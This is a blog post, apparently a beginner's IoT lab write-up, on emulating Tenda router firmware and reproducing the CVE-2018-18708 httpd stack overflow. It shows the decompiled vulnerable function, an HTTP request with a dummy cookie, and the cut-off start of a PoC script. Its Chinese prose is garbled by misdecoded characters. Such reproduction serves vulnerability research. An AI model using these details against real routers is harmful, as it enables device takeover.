<!DOCTYPE html>
<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Tenda-cve - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="
IoTç®€æ˜“å…¥é—¨
" />
	<meta property="og:image" content=""/>
	<meta property="og:title" content="Tenda-cve" />
<meta property="og:description" content="
IoTç®€æ˜“å…¥é—¨
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/posts/tenda-cve/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-03-21T00:00:00+00:00" />
<meta property="article:modified_time" content="2024-03-21T00:00:00+00:00" />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Tenda-cve"/>
<meta name="twitter:description" content="
IoTç®€æ˜“å…¥é—¨
"/>
<script src="http://localhost:1313/js/feather.min.js"></script>
	
	
        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
	

	
	
		<script type="text/javascript"
		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
		</script>

		
		<script type="text/x-mathjax-config">
		MathJax.Hub.Config({
			tex2jax: {
				inlineMath: [['$','$'], ['\\(','\\)']],
				displayMath: [['$$','$$'], ['\[','\]']],
				processEscapes: true,
				processEnvironments: true,
				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
				TeX: { equationNumbers: { autoNumber: "AMS" },
						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
			}
		});
		</script>
	

	
	
		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>

		
		<script>
			document.addEventListener("DOMContentLoaded", function() {
					renderMathInElement(document.body, {
							delimiters: [
									{left: "$$", right: "$$", display: true},
									{left: "$", right: "$", display: false}
							]
					});
			});
			</script>
	

	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="http://localhost:1313/">ldrx30</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/posts">All posts</a>
		
		<a href="/about">About</a>
		
		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
		<script src="http://localhost:1313/js/themetoggle.js"></script>
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">Tenda-cve</h1>
			<div class="meta">Posted on Mar 21, 2024</div>
		</div>
		

		

		<section class="body">
			<blockquote>
<p>IoTç®€æ˜“å…¥é—¨</p>
</blockquote>
<p>å¤ç°ï¼Œæœ‰äº†ç»éªŒåå°è¯•æŒ–æ˜</p>
<h2 id="ç¯å¢ƒ">ç¯å¢ƒ</h2>
<h3 id="å›ºä»¶è§£åŒ…">å›ºä»¶è§£åŒ…</h3>
<p><a href="https://github.com/ReFirmLabs/binwalk">binwalk</a>: å¯ä»¥åˆ†æå¹¶ä¸”è§£åŒ…</p>
<p>æ²¡æœ‰åŠ å¯†ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨binwalkè§£åŒ…</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># -e, --extract                Automatically extract known file types</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -M, --matryoshka             Recursively scan extracted files</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># ä¹Ÿå°±æ˜¯é€’å½’è§£åŒ…</span>
</span></span><span style="display:flex;"><span>$ binwalk -Me xxx.bin
</span></span></code></pre></div><h3 id="ä»¿çœŸ">ä»¿çœŸ</h3>
<p>æœ‰èµ„é‡‘å¯ä»¥ä¹°ä¸ªè®¾å¤‡ï¼Œæ•ˆæœæ›´å¥½ã€‚æ²¡èµ„é‡‘çš„å°±è™šæ‹Ÿè¿è¡Œ</p>
<p>ä¸»è¦å‚è€ƒï¼š<a href="https://github.com/SecureNexusLab/IoTFirmwareAnalysisGuide/blob/main/GuideTutorial/3-%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F.md">å›ºä»¶ä»¿çœŸ</a></p>
<h4 id="qemu-user">qemu-user</h4>
<p>ä¸‹è½½é™æ€ç¼–è¯‘çš„qemu-userï¼Œé¿å…æŸäº›åŠ¨æ€é“¾æ¥åº“å¯¼è‡´è¿è¡Œé”™è¯¯</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo apt install qemu-user-static
</span></span></code></pre></div><h4 id="qemu-system">qemu-system</h4>
<p>QEMU-Systemæ˜¯QEMUé¡¹ç›®çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒæä¾›äº†å®Œæ•´çš„è™šæ‹ŸåŒ–å’Œä»¿çœŸç¯å¢ƒï¼Œå…è®¸ç”¨æˆ·æ¨¡æ‹Ÿæ•´ä¸ªè®¡ç®—æœºç³»ç»Ÿï¼ŒåŒ…æ‹¬CPUã€å†…å­˜ã€å¤–éƒ¨è®¾å¤‡ç­‰ã€‚QEMU-Systemæ˜¯ä¸€ç§å¼ºå¤§çš„å·¥å…·ï¼Œå¯ç”¨äºå¤šç§ç”¨é€”ï¼ŒåŒ…æ‹¬è™šæ‹ŸåŒ–ã€æ“ä½œç³»ç»Ÿå¼€å‘ã€åµŒå…¥å¼ç³»ç»Ÿæµ‹è¯•å’Œä»¿çœŸç­‰ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo apt install qemu-system
</span></span></code></pre></div><h5 id="æ­å»ºç½‘æ¡¥">æ­å»ºç½‘æ¡¥</h5>
<p>bridgeæ˜¯ä¸€ä¸ªè™šæ‹Ÿç½‘ç»œè®¾å¤‡ï¼Œæ‰€ä»¥å…·æœ‰ç½‘ç»œè®¾å¤‡çš„ç‰¹å¾ï¼Œå¯ä»¥é…ç½®IPã€MACåœ°å€ç­‰ï¼›å…¶æ¬¡ï¼Œbridgeæ˜¯ä¸€ä¸ªè™šæ‹Ÿäº¤æ¢æœºï¼Œå’Œç‰©ç†äº¤æ¢æœºæœ‰ç±»ä¼¼çš„åŠŸèƒ½ã€‚</p>
<p>æ·»åŠ ä¸€ä¸ªè™šæ‹Ÿç½‘æ¡¥å¹¶ä¸”è·å¾—IPåœ°å€</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo apt install uml-utilities bridge-utils net-tools
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># æ·»åŠ ä¸€ä¸ªç½‘æ¡¥</span>
</span></span><span style="display:flex;"><span>$ sudo brctl addbr br0
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># add interface</span>
</span></span><span style="display:flex;"><span>$ sudo brctl addif br0 eth0
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># ç½‘æ¡¥ up</span>
</span></span><span style="display:flex;"><span>$ sudo ifconfig br0 up
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># dhcp è·å¾—IP</span>
</span></span><span style="display:flex;"><span>$ sudo dhclient br0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># åˆ é™¤ç½‘æ¡¥</span>
</span></span><span style="display:flex;"><span>$ sudo ifconfig br0 down         
</span></span><span style="display:flex;"><span>$ sudo brctl delbr br0
</span></span></code></pre></div><p>iproute2: <a href="https://linux.cn/article-4326-1.html">iproute2 å¯¹å†³ net-tools</a>ï¼Œç°åœ¨å¤§éƒ¨åˆ†linuxé»˜è®¤å®‰è£…è¿™ä¸ªå·¥å…·è€Œä¸æ˜¯net-tools</p>
<p>å‚è€ƒ <a href="https://wiki.archlinux.org/title/Network_bridge">ArchWiki</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># æ–°å»ºä¸€ä¸ªç½‘æ¡¥</span>
</span></span><span style="display:flex;"><span>$ sudo ip link add name br0 <span style="color:#8be9fd;font-style:italic">type</span> bridge
</span></span><span style="display:flex;"><span>$ sudo ip link <span style="color:#8be9fd;font-style:italic">set</span> dev br0 up
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># å°†ç½‘å¡åŠ å…¥/åˆ é™¤ç½‘æ¡¥</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># æƒ³è¦æ·»åŠ Interfaceåˆ°ç½‘æ¡¥ä¸Šï¼ŒinterfaceçŠ¶æ€å¿…é¡»æ˜¯Up</span>
</span></span><span style="display:flex;"><span>$ sudo ip link <span style="color:#8be9fd;font-style:italic">set</span> eth1 master br0
</span></span><span style="display:flex;"><span>$ sudo ip link <span style="color:#8be9fd;font-style:italic">set</span> eth1 nomaster
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># è®¾ç½®ipåœ°å€,éœ€è¦ç»“åˆè‡ªå·±çš„ç½‘å…³ç­‰è¿›è¡Œè®¾ç½®</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># IP address attached toÂ eth1:Â 10.2.3.4/8</span>
</span></span><span style="display:flex;"><span>$ sudo ip address add 10.2.3.4/8 dev br0
</span></span></code></pre></div><p>tunç½‘å¡</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ip tuntap add dev tap0 mod tap <span style="color:#6272a4"># åˆ›å»º tap </span>
</span></span><span style="display:flex;"><span>$ ip tuntap add dev tun0 mod tun <span style="color:#6272a4"># åˆ›å»º tun</span>
</span></span></code></pre></div><h5 id="chroot">chroot</h5>
<p>é¦–å…ˆï¼Œå¯ä»¥åœ¨<a href="https://people.debian.org/~aurel32/qemu">aurel32/qemu</a>ä¸‹è½½qemu-systemæ‰€éœ€çš„æ–‡ä»¶</p>
<ul>
<li>kernel: zImage æ ¼å¼å‹ç¼©çš„ linux kernel</li>
<li>inited: ramdisk é•œåƒ</li>
<li>drive: æ–‡ä»¶ç³»ç»Ÿé•œåƒ</li>
<li>ä¸»è¦æ˜¯netï¼Œè®¾ç½®ä¸ºæˆ‘ä»¬è®¾ç½®çš„ç½‘æ¡¥</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>qemu-system-arm <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>	-M vexpress-a9 <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>	-kernel vmlinuz-3.2.0-4-vexpress <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>	-initrd initrd.img-3.2.0-4-vexpress <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>	-drive <span style="color:#ff79c6">if</span><span style="color:#ff79c6">=</span>sd,file<span style="color:#ff79c6">=</span>debian_wheezy_armhf_standard.qcow2 <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>	-append <span style="color:#f1fa8c">&#34;root=/dev/mmcblk0p2 console=ttyAMA0&#34;</span> <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>	-net nic <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>	-net tap,ifname<span style="color:#ff79c6">=</span>br0,script<span style="color:#ff79c6">=</span>no,downscript<span style="color:#ff79c6">=</span>no <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>	-nographic
</span></span></code></pre></div><h4 id="fat">FAT</h4>
<p><a href="https://github.com/attify/firmware-analysis-toolkit">firmware-analysis-toolkit</a>: ä¾èµ–<a href="https://github.com/firmadyne/firmadyne">firmadyne</a>è¿›è¡Œæ¨¡æ‹Ÿ</p>
<p>å®‰è£…ï¼Œä¼šå®‰è£…binwalkï¼Œå¹¶ä¸”å’Œä¹‹å‰çš„å†²çª</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ git clone https://github.com/attify/firmware-analysis-toolkit
</span></span><span style="display:flex;"><span>$ <span style="color:#8be9fd;font-style:italic">cd</span> firmware-analysis-toolkit
</span></span><span style="display:flex;"><span>$ ./setup.sh
</span></span></code></pre></div><p>ä½¿ç”¨</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./fat.py xxx.bin
</span></span></code></pre></div><h4 id="unicorn">Unicorn</h4>
<p>Unicorn æ˜¯ä¸€ä¸ª CPU æ¨¡æ‹Ÿå™¨ï¼Œ</p>
<p><a href="https://github.com/unicorn-engine/unicorn">unicorn: Unicorn CPU emulator framework (ARM, AArch64, M68K, Mips, Sparc, PowerPC, RiscV, S390x, TriCore, X86) </a></p>
<h4 id="qiling">Qiling</h4>
<p>qilingç”±Unicornå¼•æ“æ”¯æŒã€‚</p>
<p><a href="https://github.com/qilingframework/qiling">qiling: A True Instrumentable Binary Emulation Framework</a></p>
<p>æºç æˆ–è€…docker</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ git clone https://github.com/qilingframework/qiling
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># æ–‡ä»¶ç³»ç»Ÿ</span>
</span></span><span style="display:flex;"><span>$ <span style="color:#8be9fd;font-style:italic">cd</span> qiling <span style="color:#ff79c6">&amp;&amp;</span> git submodule update --init --recursive pip3 install .
</span></span><span style="display:flex;"><span>$ pip3 install .
</span></span></code></pre></div><h2 id="ç¼–è¯‘ghidra">ç¼–è¯‘ghidra</h2>
<p>mipsåç¼–è¯‘ä¸‹ghidraæ›´å¥½ç”¨</p>
<p>Linuxå¯ä»¥ä½¿ç”¨åŒ…ç®¡ç†å™¨ä¸‹è½½ï¼Œwindowsä¹Ÿå¯ä»¥ç›´æ¥ä¸‹è½½releaseé‡Œçš„å†…å®¹ã€‚</p>
<p>ç¼–è¯‘ç»“æœåœ¨<code>build/dist/</code>ï¼Œæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè¿™æ ·æ¯æ¬¡æ›´æ–°å°±é‡æ–°ç¼–è¯‘ï¼Œä¸ç”¨æ¯æ¬¡æ›´æ–°ä¸‹è½½releaseäº†</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS&gt; gradle -I gradle/support/fetchDependencies.gradle init
</span></span><span style="display:flex;"><span>PS&gt; gradle buildGhidra
</span></span></code></pre></div><h2 id="è·å–å›ºä»¶">è·å–å›ºä»¶</h2>
<p><a href="https://github.com/re1wn/IoT-fstm/blob/main/IoT-project/%E7%89%A9%E8%81%94%E7%BD%91%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97.md">ç‰©è”ç½‘è®¾å¤‡å›ºä»¶åˆ†ææŒ‡å—</a></p>
<ol>
<li>ç¡¬ä»¶ï¼šé£çº¿ï¼Œæ‹†èŠ¯ç‰‡ï¼Œuartä¸²å£</li>
<li>ç½‘ç»œæŠ“åŒ…ï¼šæ›´æ–°åŒ…æ—¶ä¼šè¯·æ±‚å¹¶ä¸”ä¸‹è½½</li>
<li>å®˜ç½‘ï¼šå®˜ç½‘æä¾›ä¸‹è½½</li>
<li>ä¼¸æ‰‹å…šï¼šé—®è®¤è¯†çš„å¤§ä½¬è¦ğŸ˜‹</li>
</ol>
<h2 id="ida-plugins">IDA plugins</h2>
<p>å†å¹´æ¯”è¾ƒå¥½çš„IDAæ’ä»¶ï¼Œæ”¹urlåé¢çš„å¹´ä»½æŸ¥çœ‹ï¼š<a href="https://hex-rays.com/contests_details/contest2023/">Plug-In Contest</a></p>
<p>ä¹Ÿå¯ä»¥è‡ªå·±å¼€å‘</p>
<h2 id="tenda">tenda</h2>
<ul>
<li><a href="https://www.tenda.com.cn/download/default.html">èµ„æ–™ä¸‹è½½_è…¾è¾¾å®˜æ–¹ç½‘ç«™</a></li>
<li><a href="https://www.tendacn.com/download/default.html">Download_Tenda-All For Better NetWorking</a></li>
</ul>
<h3 id="cve-2018-18708">CVE-2018-18708</h3>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.xmcve.com/2022/10/08/CVE-2018-18708-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Tenda CVE-2018-18708 æ¼æ´å¤ç°</a></p>
<p>å›ºä»¶: <a href="https://www.tenda.com.cn/download/detail-2680.html">AC15 V15.03.05.19</a></p>
<p>æ¼æ´å­˜åœ¨äºbin/httpdï¼šè·¯ç”±å™¨çš„webæœåŠ¡å™¨â€”â€”httpdä¸­çš„ä¸€ä¸ªç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚ åœ¨å¤„ç† post è¯·æ±‚çš„å‡½æ•°<code>fromAddressNat</code>çš„<code>page</code>å‚æ•°æ—¶ï¼Œè¯¥å€¼ç›´æ¥åœ¨ sprintf ä¸­ç”¨äºæ”¾ç½®åœ¨å †æ ˆä¸Šçš„å±€éƒ¨å˜é‡ï¼Œè¿™ä¼šè¦†ç›–å‡½æ•°çš„è¿”å›åœ°å€ã€‚</p>
<p>ç›´æ¥çœ‹åç¼–è¯‘ä»£ç ï¼Œ<code>entrys</code>Â <code>mitInterface</code>Â <code>page</code>ä¸‰ä¸ªå‚æ•°ç”¨æˆ·å¯æ§ï¼Œpageä¼šè¢«sprintfæ‹¼æ¥åˆ°v6ä¸­ï¼Œ å¹¶æ²¡æœ‰å¯¹å¤§å°è¿›è¡Œæ£€æŸ¥ï¼Œå¯¼è‡´äº†æ ˆæº¢å‡ºæ¼æ´</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">fromAddressNat</span>(<span style="color:#8be9fd">int</span> a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> v1; <span style="color:#6272a4">// r0
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> v4[<span style="color:#bd93f9">256</span>]; <span style="color:#6272a4">// [sp+14h] [bp-418h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> s[<span style="color:#bd93f9">512</span>]; <span style="color:#6272a4">// [sp+114h] [bp-318h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> v6[<span style="color:#bd93f9">256</span>]; <span style="color:#6272a4">// [sp+314h] [bp-118h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>v7; <span style="color:#6272a4">// [sp+414h] [bp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>v8; <span style="color:#6272a4">// [sp+418h] [bp-14h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>v9; <span style="color:#6272a4">// [sp+41Ch] [bp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  memset(v4, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(v4));
</span></span><span style="display:flex;"><span>  v9 <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)sub_2BA8C(a1, <span style="color:#f1fa8c">&#34;entrys&#34;</span>, <span style="color:#ff79c6">&amp;</span>unk_E5D48);
</span></span><span style="display:flex;"><span>  v8 <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)sub_2BA8C(a1, <span style="color:#f1fa8c">&#34;mitInterface&#34;</span>, <span style="color:#ff79c6">&amp;</span>unk_E5D48);
</span></span><span style="display:flex;"><span>  sprintf(s, <span style="color:#f1fa8c">&#34;%s;%s&#34;</span>, v9, v8);
</span></span><span style="display:flex;"><span>  sub_4EC58(<span style="color:#f1fa8c">&#34;adv.addrnat&#34;</span>, s, <span style="color:#bd93f9">126</span>);
</span></span><span style="display:flex;"><span>  v7 <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)sub_2BA8C(a1, <span style="color:#f1fa8c">&#34;page&#34;</span>, <span style="color:#f1fa8c">&#34;1&#34;</span>);
</span></span><span style="display:flex;"><span>  v1 <span style="color:#ff79c6">=</span> sprintf(v6, <span style="color:#f1fa8c">&#34;advance/addressNatList.asp?page=%s&#34;</span>, v7);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( CommitCfm(v1) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    sprintf(v4, <span style="color:#f1fa8c">&#34;advance_type=%d&#34;</span>, <span style="color:#bd93f9">7</span>);
</span></span><span style="display:flex;"><span>    send_msg_to_netctrl(<span style="color:#bd93f9">5</span>, v4);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> sub_2BE4C(a1, v6);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>äº¤å‰å¼•ç”¨å¯»æ‰¾åˆ°ï¼Œæ¨æµ‹æ˜¯æ³¨å†Œè·¯ç”±çš„åœ°æ–¹ï¼Œæˆ‘ä»¬å¯ä»¥ä»è¿™å…¥æ‰‹æŒ–æ´</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">sub_42378</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// ...
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  sub_171EC(<span style="color:#f1fa8c">&#34;GetStaticRouteCfg&#34;</span>, formGetRouteStatic);
</span></span><span style="display:flex;"><span>  sub_171EC(<span style="color:#f1fa8c">&#34;SetStaticRouteCfg&#34;</span>, fromSetRouteStatic);
</span></span><span style="display:flex;"><span>  sub_171EC(<span style="color:#f1fa8c">&#34;addressNat&#34;</span>, fromAddressNat);
</span></span><span style="display:flex;"><span>  sub_10120(<span style="color:#f1fa8c">&#34;mNatGetStatic&#34;</span>, mNatGetStatic);
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">//...
</span></span></span></code></pre></div><p>ç„¶åè¿è¡ŒhttpæœåŠ¡ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>$ cp $(which qemu<span style="color:#ff79c6">-</span>arm<span style="color:#ff79c6">-</span><span style="color:#ff79c6">static</span>) .
</span></span><span style="display:flex;"><span>$ sudo chroot . .<span style="color:#ff79c6">/</span>qemu<span style="color:#ff79c6">-</span>arm<span style="color:#ff79c6">-</span><span style="color:#ff79c6">static</span> bin<span style="color:#ff79c6">/</span>httpd
</span></span></code></pre></div><p>ç„¶åå¯¹ç€å‚è€ƒæ–‡ç« è¿›è¡Œpatchï¼Œæˆ–è€…é…ç½®ç½‘æ¡¥</p>
<p>é…ç½®ç½‘æ¡¥ï¼Œè‡³äºç½‘æ¡¥åç§°ä¸ºä»€ä¹ˆæ˜¯br0ï¼š<a href="https://blog.csdn.net/song_lee/article/details/113800058">Tenda AC15 è·¯ç”±å™¨æ¼æ´åˆ†æä¸å¤ç°</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ip link add br0 <span style="color:#8be9fd;font-style:italic">type</span> bridge
</span></span><span style="display:flex;"><span>sudo ip link <span style="color:#8be9fd;font-style:italic">set</span> eth0 br0 master
</span></span><span style="display:flex;"><span>sudo ip link <span style="color:#8be9fd;font-style:italic">set</span> br0 up
</span></span><span style="display:flex;"><span>sudo ip addr add dev br0 192.168.85.200/24 
</span></span></code></pre></div><p>cfm fail: patchä¸€ä¸‹</p>
<ul>
<li>é—®é¢˜è§£å†³ï¼š<a href="https://blog.csdn.net/FigBB/article/details/134856961">ida proä½¿ç”¨Apply patches toä¿å­˜ä¿®æ”¹æ—¶æç¤ºpatching canceled..è§£å†³æ–¹æ³•</a></li>
</ul>
<p>Cookie: password=æ˜¯å¿…è¦çš„ï¼Œåé¢çš„å€¼å¯ä»¥éšä¾¿å¡«</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>GET /main.html HTTP/1.1
</span></span><span style="display:flex;"><span>Host: 192.168.85.131
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: 1
</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span style="display:flex;"><span>Cookie: password=hamster
</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q=0.9
</span></span><span style="display:flex;"><span>Connection: 
</span></span></code></pre></div><p>ä½¿ç”¨ç»™å‡ºPoCå¯¼è‡´segment faultï¼Œå°†IPæ”¹äº†ï¼Œå…¶ä½™ä¸é‡è¦</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> socket
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>li <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">lambda</span> x : <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x1b</span><span style="color:#f1fa8c">[01;38;5;214m&#39;</span> <span style="color:#ff79c6">+</span> x <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x1b</span><span style="color:#f1fa8c">[0m&#39;</span>)
